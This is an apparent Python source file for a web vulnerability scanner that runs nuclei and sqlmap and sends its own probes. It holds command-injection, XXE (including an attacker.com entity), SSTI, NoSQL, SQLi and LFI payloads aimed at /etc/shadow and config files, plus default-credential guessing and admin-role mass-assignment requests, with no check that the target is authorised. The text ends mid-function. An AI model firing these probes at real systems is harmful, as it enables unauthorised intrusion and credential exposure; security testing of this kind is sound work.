#!/usr/bin/env python3
import asyncio
import subprocess
import json
import os
import requests
import random
import string
from typing import List, Dict, Any
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlunparse

class VulnerabilityScanner:
    """Enhanced vulnerability scanning with authentication, advanced injection, and business logic testing"""
    
    def __init__(self):
        self.logger = self._create_logger()
        # FIX: Initialize session properly
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        # Disable SSL warnings for testing
        requests.packages.urllib3.disable_warnings()
    
    def _create_logger(self):
        """Create a simple logger for the vulnerability scanner"""
        class SimpleLogger:
            def info(self, msg):
                print(f"ðŸ” {msg}")
            def debug(self, msg):
                print(f"ðŸ”§ {msg}")
            def warning(self, msg):
                print(f"âš ï¸ {msg}")
            def error(self, msg):
                print(f"âŒ {msg}")
        return SimpleLogger()
    
    async def run_command_with_timeout(self, cmd: str, timeout: int = 60) -> tuple:
        """Run a command with proper timeout handling"""
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Use asyncio.wait_for for timeout
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
                return process.returncode, stdout, stderr
            except asyncio.TimeoutError:
                print(f"         Command timeout: {cmd.split(' ')[0]}")
                process.terminate()
                return -1, None, None
                
        except Exception as e:
            print(f"         Command error: {e}")
            return -1, None, None
    
    async def run_nuclei(self, target: str) -> List[Dict]:
        """Run Nuclei vulnerability scanner"""
        try:
            # Use enhanced nuclei with proper templates
            return await self.run_nuclei_scan_async(target)
            
        except Exception as e:
            print(f"âŒ Nuclei error for {target}: {e}")
            return []
    
    async def run_nuclei_scan_async(self, target: str) -> List[Dict]:
        """Run comprehensive nuclei scan with proper templates (async version)"""
        try:
            self.logger.info(f"Running Nuclei scan on {target}")
            
            # Get nuclei templates path
            templates_path = self.get_nuclei_templates_path()
            
            # Build nuclei command
            cmd = ['nuclei', '-u', target, '-json', '-silent']
            
            # Add templates if found
            if templates_path:
                cmd.extend(['-t', f'{templates_path}/http/'])
                cmd.extend(['-t', f'{templates_path}/http/exposures/'])
                cmd.extend(['-t', f'{templates_path}/http/vulnerabilities/'])
            else:
                # Use default nuclei behavior if templates not found
                cmd.extend(['-t', 'http/'])
            
            # Add additional options
            cmd.extend([
                '-severity', 'low,medium,high,critical',
                '-rate-limit', '100',
                '-timeout', '10'
            ])
            
            # Add PHP-specific templates if target is PHP
            if self._is_php_target(target) and templates_path:
                cmd.extend(['-t', f'{templates_path}/http/technologies/php.yaml'])
            
            self.logger.debug(f"Running nuclei command: {' '.join(cmd)}")
            
            # Run as subprocess
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
            
            vulnerabilities = []
            if stdout:
                output = stdout.decode()
                for line in output.strip().split('\n'):
                    if line:
                        try:
                            vuln_data = json.loads(line)
                            vulnerability = {
                                'type': vuln_data.get('template-id', 'Unknown'),
                                'url': target,
                                'severity': vuln_data.get('info', {}).get('severity', 'unknown'),
                                'tool': 'nuclei',
                                'evidence': vuln_data.get('matcher-name', ''),
                                'description': vuln_data.get('info', {}).get('description', ''),
                                'timestamp': datetime.now().isoformat()
                            }
                            vulnerabilities.append(vulnerability)
                            self.logger.info(f"Nuclei found: {vulnerability['type']} - {vulnerability['severity']}")
                        except json.JSONDecodeError as e:
                            self.logger.debug(f"Failed to parse nuclei output: {e}")
                            continue
            
            if not vulnerabilities:
                self.logger.info(f"Nuclei found no vulnerabilities for {target}")
            
            return vulnerabilities
            
        except asyncio.TimeoutError:
            self.logger.warning(f"Nuclei scan timed out for {target}")
            return []
        except Exception as e:
            self.logger.error(f"Nuclei scan failed: {str(e)}")
            return []
    
    def get_nuclei_templates_path(self):
        """Get nuclei templates path with fallback"""
        possible_paths = [
            '/root/nuclei-templates',
            '/home/kali/nuclei-templates',
            '/opt/nuclei-templates', 
            '/usr/share/nuclei-templates',
            os.path.expanduser('~/nuclei-templates')
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                self.logger.info(f"Found nuclei templates at: {path}")
                return path
        
        self.logger.warning("Nuclei templates not found in standard locations")
        return None
    
    def _is_php_target(self, url: str) -> bool:
        """Check if target is PHP-based"""
        try:
            # Get base URL without parameters for testing
            base_url = url.split('?')[0] if '?' in url else url
            response = self.session.get(base_url, timeout=5, verify=False)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            php_indicators = [
                '.php' in url,
                '.php' in content,
                'php' in headers,
                'x-powered-by: php' in headers
            ]
            
            return any(php_indicators)
        except:
            return False
    
    
    # ADD THESE METHODS TO YOUR EXISTING vulnerability_scanner.py

    # ADVANCED INJECTION TESTING METHODS
    async def run_advanced_injection_tests(self, target_url: str, crawled_urls: List[str]) -> List[Dict]:
        """Run advanced injection vulnerability tests"""
        self.logger.info("ðŸŽ¯ Running advanced injection tests...")
        findings = []
        
        # Test for Command Injection
        cmd_findings = await self._test_command_injection(target_url, crawled_urls)
        findings.extend(cmd_findings)
        
        # Test for XXE Injection
        xxe_findings = await self._test_xxe_injection(target_url, crawled_urls)
        findings.extend(xxe_findings)
        
        # Test for SSTI (Server-Side Template Injection)
        ssti_findings = await self._test_ssti_injection(target_url, crawled_urls)
        findings.extend(ssti_findings)
        
        # Test for NoSQL Injection
        nosql_findings = await self._test_nosql_injection(target_url, crawled_urls)
        findings.extend(nosql_findings)
        
        return findings

    async def _test_command_injection(self, base_url: str, urls: List[str]) -> List[Dict]:
        """Test for OS command injection vulnerabilities"""
        findings = []
        cmd_payloads = [
            ';id',
            '|id',
            '&&id',
            '||id',
            '`id`',
            '$(id)',
            ';whoami',
            '|ls',
            ';cat /etc/passwd'
        ]
        
        for url in urls[:10]:  # Test first 10 URLs
            if '?' not in url:
                continue
                
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in cmd_payloads:
                    try:
                        test_url = self.build_test_url(url, param, payload)
                        response = self.session.get(test_url, timeout=5, verify=False)
                        
                        # Check for command injection indicators
                        if any(indicator in response.text for indicator in 
                              ['uid=', 'gid=', 'groups=', 'root:', '/bin/bash', 'www-data']):
                            finding = {
                                'type': 'Command Injection',
                                'url': test_url,
                                'severity': 'critical',
                                'confidence': 'medium',
                                'tool': 'cmd_injection_test',
                                'evidence': f'Command output found with payload: {payload}',
                                'description': 'Potential OS command injection vulnerability',
                                'timestamp': datetime.now().isoformat()
                            }
                            findings.append(finding)
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"Command injection test failed: {e}")
        
        return findings

    async def _test_xxe_injection(self, base_url: str, urls: List[str]) -> List[Dict]:
        """Test for XXE (XML External Entity) injection"""
        findings = []
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]>'
        ]
        
        # Test endpoints that might process XML
        xml_endpoints = [url for url in urls if any(xml_indicator in url.lower() for xml_indicator in 
                          ['/api', '/soap', '/xml', '/rss', '/feed'])]
        
        for endpoint in xml_endpoints[:5]:
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=10, verify=False)
                    
                    if 'root:' in response.text or 'www-data' in response.text:
                        finding = {
                            'type': 'XXE Injection',
                            'url': endpoint,
                            'severity': 'critical',
                            'confidence': 'medium',
                            'tool': 'xxe_test',
                            'evidence': 'XML external entity injection possible',
                            'description': 'XML parser processes external entities',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        break
                        
                except Exception as e:
                    self.logger.debug(f"XXE test failed: {e}")
        
        return findings

    async def _test_ssti_injection(self, base_url: str, urls: List[str]) -> List[Dict]:
        """Test for Server-Side Template Injection"""
        findings = []
        ssti_payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '${7*7}',
            'velocity': '#set($x=7*7)',
            'smarty': '{7*7}',
            'mako': '${7*7}'
        }
        
        for url in urls[:10]:
            if '?' not in url:
                continue
                
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for engine, payload in ssti_payloads.items():
                    try:
                        test_url = self.build_test_url(url, param, payload)
                        response = self.session.get(test_url, timeout=5, verify=False)
                        
                        # Check if template was executed
                        if '49' in response.text and payload not in response.text:
                            finding = {
                                'type': 'Server-Side Template Injection',
                                'url': test_url,
                                'severity': 'high',
                                'confidence': 'medium',
                                'tool': 'ssti_test',
                                'evidence': f'SSTI detected with {engine} payload',
                                'description': f'Potential {engine} template injection',
                                'timestamp': datetime.now().isoformat()
                            }
                            findings.append(finding)
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"SSTI test failed: {e}")
        
        return findings

    async def _test_nosql_injection(self, base_url: str, urls: List[str]) -> List[Dict]:
        """Test for NoSQL injection vulnerabilities"""
        findings = []
        nosql_payloads = [
            '{"$ne": "invalid"}',
            '{"$gt": ""}',
            '{"$where": "1==1"}',
            'admin\' || \'1==\'1'
        ]
        
        # Look for API endpoints that might use NoSQL
        api_endpoints = [url for url in urls if any(api_indicator in url.lower() for api_indicator in 
                          ['/api', '/rest', '/graphql', '/query'])]
        
        for endpoint in api_endpoints[:5]:
            for payload in nosql_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    test_data = {'username': payload, 'password': 'test'}
                    response = self.session.post(endpoint, json=test_data, headers=headers, timeout=10, verify=False)
                    
                    # Check for authentication bypass
                    if any(success_indicator in response.text.lower() for success_indicator in 
                          ['success', 'true', 'welcome', 'token']):
                        finding = {
                            'type': 'NoSQL Injection',
                            'url': endpoint,
                            'severity': 'high',
                            'confidence': 'medium',
                            'tool': 'nosql_test',
                            'evidence': f'NoSQL injection with payload: {payload}',
                            'description': 'Potential NoSQL injection vulnerability',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        break
                        
                except Exception as e:
                    self.logger.debug(f"NoSQL test failed: {e}")
        
        return findings

    # BUSINESS LOGIC TESTING METHODS
    async def run_business_logic_tests(self, target_url: str, crawled_urls: List[str]) -> List[Dict]:
        """Run business logic vulnerability tests"""
        self.logger.info("ðŸ’¼ Running business logic tests...")
        findings = []
        
        # Test for IDOR (Insecure Direct Object Reference)
        idor_findings = await self._test_idor_vulnerabilities(target_url, crawled_urls)
        findings.extend(idor_findings)
        
        # Test for Price Manipulation
        price_findings = await self._test_price_manipulation(target_url)
        findings.extend(price_findings)
        
        # Test for Workflow Bypass
        workflow_findings = await self._test_workflow_bypass(target_url)
        findings.extend(workflow_findings)
        
        # Test for Mass Assignment
        mass_assignment_findings = await self._test_mass_assignment(target_url)
        findings.extend(mass_assignment_findings)
        
        return findings

    async def _test_idor_vulnerabilities(self, base_url: str, urls: List[str]) -> List[Dict]:
        """Test for Insecure Direct Object References"""
        findings = []
        
        # Look for URLs with numeric IDs or usernames
        id_patterns = [
            r'id=(\d+)',
            r'user=(\w+)',
            r'account=(\d+)',
            r'order=(\d+)',
            r'product=(\d+)'
        ]
        
        for url in urls:
            for pattern in id_patterns:
                import re
                matches = re.findall(pattern, url)
                if matches:
                    original_id = matches[0]
                    
                    # Test with different IDs
                    test_ids = ['1', '2', '100', 'admin', 'test']
                    
                    for test_id in test_ids:
                        if test_id != original_id:
                            test_url = url.replace(original_id, test_id)
                            
                            try:
                                original_response = self.session.get(url, timeout=5, verify=False)
                                test_response = self.session.get(test_url, timeout=5, verify=False)
                                
                                # If we get similar content with different ID, potential IDOR
                                if (test_response.status_code == 200 and 
                                    original_response.status_code == 200 and
                                    len(test_response.text) > 100 and  # Not an error page
                                    test_response.text != original_response.text):
                                    
                                    finding = {
                                        'type': 'Insecure Direct Object Reference (IDOR)',
                                        'url': test_url,
                                        'severity': 'high',
                                        'confidence': 'medium',
                                        'tool': 'business_logic_test',
                                        'evidence': f'Accessed resource with different ID: {test_id}',
                                        'description': 'Potential IDOR vulnerability allowing access to unauthorized resources',
                                        'timestamp': datetime.now().isoformat()
                                    }
                                    findings.append(finding)
                                    break
                                    
                            except Exception as e:
                                self.logger.debug(f"IDOR test failed: {e}")
        
        return findings

    async def _test_price_manipulation(self, base_url: str) -> List[Dict]:
        """Test for price manipulation vulnerabilities"""
        findings = []
        
        # Look for cart/checkout endpoints
        cart_urls = [
            f"{base_url.rstrip('/')}/cart",
            f"{base_url.rstrip('/')}/checkout",
            f"{base_url.rstrip('/')}/basket"
        ]
        
        for cart_url in cart_urls:
            try:
                response = self.session.get(cart_url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Check if there are price-related parameters
                    if any(price_indicator in response.text.lower() for price_indicator in 
                          ['price', 'total', 'amount', 'cost']):
                        
                        finding = {
                            'type': 'Potential Price Manipulation',
                            'url': cart_url,
                            'severity': 'medium',
                            'confidence': 'low',
                            'tool': 'business_logic_test',
                            'evidence': 'Price-related parameters found',
                            'description': 'Application may be vulnerable to price manipulation attacks',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        
            except Exception as e:
                self.logger.debug(f"Price manipulation test failed: {e}")
        
        return findings

    async def _test_workflow_bypass(self, base_url: str) -> List[Dict]:
        """Test for workflow bypass vulnerabilities"""
        findings = []
        
        # Test common workflow endpoints
        workflow_urls = [
            f"{base_url.rstrip('/')}/checkout/confirm",
            f"{base_url.rstrip('/')}/order/complete",
            f"{base_url.rstrip('/')}/payment/success"
        ]
        
        for workflow_url in workflow_urls:
            try:
                response = self.session.get(workflow_url, timeout=5, verify=False)
                if response.status_code == 200:
                    # If we can access completion page without going through workflow
                    finding = {
                        'type': 'Potential Workflow Bypass',
                        'url': workflow_url,
                        'severity': 'medium',
                        'confidence': 'low',
                        'tool': 'business_logic_test',
                        'evidence': 'Workflow endpoint accessible without authentication',
                        'description': 'Potential workflow bypass vulnerability',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                    
            except Exception as e:
                self.logger.debug(f"Workflow bypass test failed: {e}")
        
        return findings

    async def _test_mass_assignment(self, base_url: str) -> List[Dict]:
        """Test for mass assignment vulnerabilities"""
        findings = []
        
        # Look for registration/update endpoints
        mass_urls = [
            f"{base_url.rstrip('/')}/register",
            f"{base_url.rstrip('/')}/signup",
            f"{base_url.rstrip('/')}/profile/update"
        ]
        
        for mass_url in mass_urls:
            try:
                response = self.session.get(mass_url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Test with privileged parameters
                    test_data = {
                        'username': 'testuser',
                        'password': 'testpass123',
                        'email': 'test@example.com',
                        'role': 'admin',
                        'is_admin': 'true',
                        'privileges': 'all'
                    }
                    
                    submit_response = self.session.post(mass_url, data=test_data, timeout=10, verify=False)
                    
                    if submit_response.status_code == 200:
                        finding = {
                            'type': 'Potential Mass Assignment',
                            'url': mass_url,
                            'severity': 'high',
                            'confidence': 'low',
                            'tool': 'business_logic_test',
                            'evidence': 'Accepted request with privileged parameters',
                            'description': 'Potential mass assignment vulnerability allowing privilege escalation',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        
            except Exception as e:
                self.logger.debug(f"Mass assignment test failed: {e}")
        
        return findings

    # ENHANCE THE COMPREHENSIVE TESTING METHOD
    async def run_comprehensive_tests(self, target: Dict, crawled_urls: List[str]) -> List[Dict]:
        """Run all comprehensive vulnerability tests"""
        url = target['url']
        findings = []
        
        print(f"         Testing: {url[:60]}...")
        
        # Run all test categories
        test_categories = [
            ("Enhanced Nuclei", self.run_nuclei_scan_async(url)),
            ("Basic Security", self.run_basic_curl_tests(url)),
            ("SQL Injection", self.run_sqlmap_quick(url)),
            ("PHP Specific", self.run_php_specific_tests_async(url)),
            ("Authentication", self.run_authentication_tests(url)),
            ("Advanced Injection", self.run_advanced_injection_tests(url, crawled_urls)),
            ("Business Logic", self.run_business_logic_tests(url, crawled_urls)),
            ("Comprehensive LFI", self.run_comprehensive_lfi_tests(url, crawled_urls))
        ]
        
        for test_name, test_coroutine in test_categories:
            try:
                print(f"         Running {test_name} tests...")
                test_findings = await test_coroutine
                findings.extend(test_findings)
                if test_findings:
                    print(f"         âœ… {test_name} found {len(test_findings)} issues")
            except Exception as e:
                print(f"         âŒ {test_name} tests failed: {e}")
        
        print(f"         Found {len(findings)} potential issues")
        return findings
    
    
    
    async def run_sqlmap_quick(self, url: str) -> List[Dict]:
        """Run quick sqlmap scan with basic tests"""
        try:
            # Only test if URL has parameters
            if '?' not in url or '=' not in url:
                return []

            print(f"         Testing SQLi on: {url.split('?')[0]}...")

            # Improved sqlmap scan with reasonable timeouts
            param = url.split('?')[1].split('=')[0] if '?' in url else 'id'
            cmd = f"sqlmap -u '{url}' --batch --level=1 --risk=1 --flush-session --time-sec=5 --threads=2"
            
            # Increase timeout to 2 minutes (SQLMap needs time)
            returncode, stdout, stderr = await self.run_command_with_timeout(cmd, timeout=120)

            if returncode == 0 and stdout:
                output = stdout.decode()

                # Parse sqlmap output for vulnerabilities
                if any(indicator in output for indicator in [
                    "sqlmap identified the following injection point",
                    "is vulnerable", 
                    "injection point",
                    "back-end DBMS"
                ]):
                    return [{
                        'type': 'SQL Injection',
                        'url': url,
                        'tool': 'sqlmap',
                        'severity': 'high',
                        'confidence': 'high',
                        'evidence': 'SQL injection confirmed by sqlmap',
                        'parameter': param
                    }]

            return []

        except Exception as e:
            print(f"âŒ SQLMap error for {url}: {e}")
            return []
    
    async def run_basic_curl_tests(self, url: str) -> List[Dict]:
        """Run basic curl-based security tests"""
        findings = []
        
        try:
            # Test for SQL error messages
            sql_payloads = ["'", "1' OR '1'='1", "1 AND 1=1"]
            for payload in sql_payloads:
                test_url = url.replace('=', f"={payload}", 1)
                cmd = f"curl -s -k '{test_url}' --connect-timeout 5"
                returncode, stdout, stderr = await self.run_command_with_timeout(cmd, timeout=10)
                
                if returncode == 0 and stdout:
                    response = stdout.decode().lower()
                    if any(error in response for error in ['sql', 'mysql', 'database', 'syntax', 'error']):
                        findings.append({
                            'type': 'SQL Injection Potential',
                            'url': url,
                            'tool': 'curl',
                            'severity': 'medium',
                            'confidence': 'low',
                            'evidence': f'SQL error message detected with payload: {payload}',
                            'parameter': url.split('?')[1].split('=')[0] if '?' in url else 'unknown'
                        })
                        break
            
            # Test for basic XSS reflection
            xss_payload = "<script>alert('xss')</script>"
            if '?' in url:
                test_url = url.replace('=', f"={xss_payload}", 1)
                cmd = f"curl -s -k '{test_url}' --connect-timeout 5"
                returncode, stdout, stderr = await self.run_command_with_timeout(cmd, timeout=10)
                
                if returncode == 0 and stdout:
                    response = stdout.decode()
                    if xss_payload in response:
                        findings.append({
                            'type': 'XSS Potential',
                            'url': url,
                            'tool': 'curl',
                            'severity': 'medium',
                            'confidence': 'low',
                            'evidence': 'XSS payload reflected in response',
                            'parameter': url.split('?')[1].split('=')[0] if '?' in url else 'unknown'
                        })
            
            return findings
            
        except Exception as e:
            print(f"âŒ Curl test error for {url}: {e}")
            return []

    # NEW: COMPREHENSIVE LFI TESTING METHODS
    async def run_comprehensive_lfi_tests(self, target_url: str, crawled_urls: List[str]) -> List[Dict]:
        """Run comprehensive LFI testing with extended payloads and parameters"""
        self.logger.info("ðŸ“ Running comprehensive LFI tests...")
        findings = []
        
        # Test ALL crawled URLs with parameters, not just specific ones
        for url in crawled_urls[:30]:  # Test first 30 URLs
            if '?' not in url:
                continue
                
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test ALL parameters, not just file-related ones
            for param in params.keys():
                lfi_findings = await self._test_comprehensive_lfi(url, param)
                findings.extend(lfi_findings)
        
        # Also test common LFI endpoints directly
        direct_lfi_findings = await self._test_direct_lfi_endpoints(target_url)
        findings.extend(direct_lfi_findings)
        
        return findings

    async def _test_comprehensive_lfi(self, url: str, param: str) -> List[Dict]:
        """Test comprehensive LFI payloads on any parameter - FIXED VERSION"""
        findings = []
        
        # Extended LFI payloads for different systems
        lfi_payloads = [
            # Basic Unix/Linux
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../../../../etc/hosts',
            '../../../../etc/shadow',
            '../../../../proc/self/environ',
            '../../../../proc/version',
            
            # Windows
            '../../../../windows/win.ini',
            '../../../../windows/system32/drivers/etc/hosts',
            '..\\..\\..\\..\\windows\\win.ini',
            
            # PHP-specific
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=index.php',
            
            # Log file poisoning
            '../../../../var/log/apache2/access.log',
            '../../../../var/log/auth.log',
            '../../../../var/www/logs/access_log',
            
            # Configuration files
            '../../../../etc/apache2/apache2.conf',
            '../../../../etc/httpd/conf/httpd.conf',
            '../../../../.env',
            '../../../../config.php',
            '../../../../wp-config.php',
        ]
        
        lfi_indicators = {
            'root:x:0:0:': 'Unix /etc/passwd file',
            '[boot loader]': 'Windows win.ini file',
            '<?php': 'PHP source code',
            'DOCUMENT_ROOT': 'PHP environment',
            'Apache/': 'Server version info',
            'MySQL': 'Database configuration',
            'DB_PASSWORD': 'Database credentials',
            'define(': 'PHP configuration'
        }
        
        for payload in lfi_payloads:
            try:
                test_url = self.build_test_url(url, param, payload)
                response = self.session.get(test_url, timeout=8, verify=False)
                
                # FIX: Check if we got a successful response (not 404/error)
                if response.status_code == 200:
                    # Check for LFI indicators in the RESPONSE CONTENT, not the URL
                    for indicator, file_type in lfi_indicators.items():
                        if indicator in response.text:
                            # FIX: Also verify the response is different from normal
                            normal_response = self.session.get(url, timeout=5, verify=False)
                            
                            # If the response with payload is different and contains LFI indicators
                            if (response.text != normal_response.text and 
                                len(response.text) > 50):  # Not an error page
                                
                                finding = {
                                    'type': 'Local File Inclusion (LFI)',
                                    'url': test_url,
                                    'parameter': param,
                                    'severity': 'high',
                                    'confidence': 'high',
                                    'tool': 'comprehensive_lfi_test',
                                    'evidence': f'Found {file_type} content with payload: {payload}',
                                    'description': f'Local file inclusion vulnerability exposing {file_type}',
                                    'timestamp': datetime.now().isoformat()
                                }
                                findings.append(finding)
                                self.logger.info(f"âœ… REAL LFI found: {test_url}")
                                break  # Stop testing this URL if we found LFI
                            
            except Exception as e:
                self.logger.debug(f"LFI test failed for {url}: {e}")
            
        return findings

    async def _test_direct_lfi_endpoints(self, base_url: str) -> List[Dict]:
        """Test common LFI vulnerable endpoints directly"""
        findings = []
        
        common_lfi_patterns = [
            # Common vulnerable parameters
            f"{base_url}?page=../../../../etc/passwd",
            f"{base_url}?file=../../../../etc/passwd",
            f"{base_url}?load=../../../../etc/passwd",
            f"{base_url}?path=../../../../etc/passwd",
            f"{base_url}?doc=../../../../etc/passwd",
            f"{base_url}?document=../../../../etc/passwd",
            f"{base_url}?folder=../../../../etc/passwd",
            f"{base_url}?style=../../../../etc/passwd",
            f"{base_url}?template=../../../../etc/passwd",
            f"{base_url}?php_path=../../../../etc/passwd",
        ]
        
        for test_url in common_lfi_patterns:
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if 'root:x:0:0:' in response.text:
                    finding = {
                        'type': 'Local File Inclusion (LFI)',
                        'url': test_url,
                        'severity': 'high',
                        'confidence': 'high',
                        'tool': 'direct_lfi_test',
                        'evidence': 'Direct LFI endpoint exposed /etc/passwd',
                        'description': 'Direct local file inclusion vulnerability',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                    self.logger.info(f"âœ… Direct LFI found: {test_url}")
                    
            except Exception as e:
                continue
        
        return findings

    # FIXED: AUTHENTICATION TESTING METHODS
    async def run_authentication_tests(self, target_url: str) -> List[Dict]:
        """Run comprehensive authentication vulnerability tests - FIXED VERSION"""
        self.logger.info("ðŸ” Running authentication security tests...")
        findings = []
        
        # FIX: Use proper base URL construction
        base_url = target_url.rstrip('/')
        
        # Test common authentication endpoints - FIXED URL CONSTRUCTION
        auth_endpoints = [
            '/login', '/admin', '/administrator', '/wp-admin', 
            '/signin', '/signup', '/register', '/auth',
            '/dashboard', '/controlpanel', '/manager'
        ]
        
        for endpoint in auth_endpoints:
            # FIX: Construct URLs properly
            auth_url = f"{base_url}{endpoint}"
            auth_findings = await self._test_authentication_endpoint(auth_url)
            findings.extend(auth_findings)
        
        # Test for default credentials
        default_creds_findings = await self._test_default_credentials(base_url)
        findings.extend(default_creds_findings)
        
        # Test for authentication bypass
        bypass_findings = await self._test_authentication_bypass(base_url)
        findings.extend(bypass_findings)
        
        # Test for session management issues
        session_findings = await self._test_session_management(base_url)
        findings.extend(session_findings)
        
        return findings

    async def _test_authentication_endpoint(self, auth_url: str) -> List[Dict]:
        """Test specific authentication endpoints for common vulnerabilities - FIXED"""
        findings = []
        
        try:
            response = self.session.get(auth_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Check for exposed authentication forms
                if any(form_indicator in response.text.lower() for form_indicator in 
                      ['<form', 'password', 'login', 'username', 'email']):
                    
                    # Test for SQL injection in login forms
                    sql_findings = await self._test_login_sql_injection(auth_url, response.text)
                    findings.extend(sql_findings)
                    
                    # Test for weak password policy
                    weak_policy_findings = await self._test_password_policy(auth_url)
                    findings.extend(weak_policy_findings)
                    
                    finding = {
                        'type': 'Authentication Endpoint Exposed',
                        'url': auth_url,
                        'severity': 'medium',
                        'confidence': 'high',
                        'tool': 'auth_test',
                        'evidence': f'Authentication form found at {auth_url}',
                        'description': 'Authentication endpoint may be vulnerable to brute force or other attacks',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
        
        except Exception as e:
            self.logger.debug(f"Auth endpoint test failed for {auth_url}: {e}")
        
        return findings

    async def _test_login_sql_injection(self, login_url: str, page_content: str) -> List[Dict]:
        """Test login forms for SQL injection vulnerabilities"""
        findings = []
        sql_payloads = [
            "' OR '1'='1' --",
            "admin' --",
            "' OR 1=1--",
            "admin' #",
            "' OR '1'='1' /*"
        ]
        
        # Extract form fields (simplified approach)
        fields = self._extract_form_fields(page_content)
        if not fields:
            return findings
        
        for payload in sql_payloads:
            try:
                form_data = {}
                for field in fields:
                    if any(keyword in field.lower() for keyword in ['user', 'name', 'email']):
                        form_data[field] = payload
                    elif 'pass' in field.lower():
                        form_data[field] = 'password123'
                    else:
                        form_data[field] = 'test'
                
                response = self.session.post(login_url, data=form_data, timeout=10, verify=False)
                
                # Check for SQL injection indicators
                if any(indicator in response.text.lower() for indicator in 
                      ['welcome', 'dashboard', 'logout', 'success']):
                    
                    # If we get a different response than invalid credentials, might be SQLi
                    if 'invalid' not in response.text.lower() and 'incorrect' not in response.text.lower():
                        finding = {
                            'type': 'SQL Injection in Authentication',
                            'url': login_url,
                            'severity': 'high',
                            'confidence': 'medium',
                            'tool': 'auth_sqli_test',
                            'evidence': f'Potential SQLi with payload: {payload}',
                            'description': 'Login form may be vulnerable to SQL injection bypass',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        break
                        
            except Exception as e:
                self.logger.debug(f"Login SQLi test failed: {e}")
        
        return findings

    async def _test_default_credentials(self, base_url: str) -> List[Dict]:
        """Test for default credentials on common applications"""
        findings = []
        default_credentials = [
            {'user': 'admin', 'pass': 'admin'},
            {'user': 'admin', 'pass': 'password'},
            {'user': 'admin', 'pass': '123456'},
            {'user': 'administrator', 'pass': 'administrator'},
            {'user': 'root', 'pass': 'root'},
            {'user': 'test', 'pass': 'test'}
        ]
        
        login_urls = [
            f"{base_url}/login",
            f"{base_url}/admin",
            f"{base_url}/wp-login.php"
        ]
        
        for login_url in login_urls:
            for creds in default_credentials:
                try:
                    response = self.session.get(login_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        form_data = self._guess_login_fields(response.text, creds)
                        if form_data:
                            login_response = self.session.post(login_url, data=form_data, timeout=10, verify=False)
                            
                            if any(success_indicator in login_response.text.lower() for success_indicator in 
                                  ['dashboard', 'welcome', 'logout', 'success']):
                                finding = {
                                    'type': 'Default Credentials',
                                    'url': login_url,
                                    'severity': 'high',
                                    'confidence': 'high',
                                    'tool': 'auth_test',
                                    'evidence': f"Default credentials: {creds['user']}:{creds['pass']}",
                                    'description': 'Default credentials provide access to the application',
                                    'timestamp': datetime.now().isoformat()
                                }
                                findings.append(finding)
                                break
                                
                except Exception as e:
                    continue
        
        return findings

    async def _test_authentication_bypass(self, base_url: str) -> List[Dict]:
        """Test for authentication bypass techniques"""
        findings = []
        
        # Test directory traversal in authentication
        bypass_urls = [
            f"{base_url}/admin/../",
            f"{base_url}/../admin/",
            f"{base_url}/admin/..;/"
        ]
        
        for bypass_url in bypass_urls:
            try:
                response = self.session.get(bypass_url, timeout=5, verify=False)
                if response.status_code == 200 and 'admin' in response.text.lower():
                    finding = {
                        'type': 'Potential Authentication Bypass',
                        'url': bypass_url,
                        'severity': 'high',
                        'confidence': 'medium',
                        'tool': 'auth_bypass_test',
                        'evidence': f'Path traversal attempt: {bypass_url}',
                        'description': 'Potential authentication bypass via path traversal',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
            except:
                pass
        
        return findings

    async def _test_session_management(self, base_url: str) -> List[Dict]:
        """Test for session management vulnerabilities"""
        findings = []
        
        try:
            # Test if cookies lack security flags
            response = self.session.get(base_url, timeout=10, verify=False)
            
            for cookie in response.cookies:
                if not getattr(cookie, 'secure', False):
                    finding = {
                        'type': 'Insecure Cookie',
                        'url': base_url,
                        'severity': 'medium',
                        'confidence': 'high',
